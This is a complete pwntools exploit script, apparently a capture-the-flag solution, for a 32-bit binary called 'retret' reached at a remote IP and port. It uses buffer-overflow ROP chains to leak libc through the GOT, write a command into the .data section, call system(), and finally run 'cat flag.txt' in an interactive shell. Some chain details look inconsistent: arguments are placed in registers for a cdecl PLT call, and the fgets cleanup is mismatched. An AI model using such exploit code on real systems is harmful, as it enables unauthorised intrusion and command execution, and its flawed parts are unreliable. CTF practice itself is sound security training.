from pwn import *

context(arch='i386', os='linux')

# Binary configuration
e = ELF('./retret')
libc = ELF('./libc.so.6')

# Gadgets (from ROPgadget output)
pop_ebx = 0x0804901e    # pop ebx; ret
pop_ecx = 0x0804909a    # pop ecx; ret
pop_edx = 0x080490f6    # pop edx; ret
ret = 0x08049022         # Stack alignment

# Writable memory (adjust using readelf -S ./retret)
data_addr = 0x0804c020   # .data section

p = remote("10.20.12.187", 4005)

# ===== Stage 1: Leak libc =====
payload1 = flat(
    b'A' * 0x1004,       # parse()'s buffer + EBP
    # sys_write(1, __libc_start_main@got, 4)
    pop_ebx, 1,
    pop_ecx, e.got['__libc_start_main'],
    pop_edx, 4,
    e.plt['write'],
    e.sym['main']        # Restart program
)

p.sendline(payload1)
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['__libc_start_main']
log.success(f"Libc base: {hex(libc_base)}")

# ===== Stage 2: Write "cat flag.txt" and execute =====
system_addr = libc_base + libc.symbols['system']
stdin_ptr = libc_base + libc.symbols['_IO_2_1_stdin_']

payload2 = flat(
    b'A' * 0x2004,       # main()'s buffer + EBP
    # fgets(data_addr, 50, stdin)
    e.plt['fgets'],
    pop_ebx,             # Cleanup after fgets
    data_addr,
    50,                  # Read up to 50 bytes
    stdin_ptr,
    # Call system(data_addr)
    ret,                 # Stack alignment
    system_addr,
    data_addr
)

p.sendline(payload2)
p.sendline(b"cat flag.txt\x00")  # Send command
p.interactive()
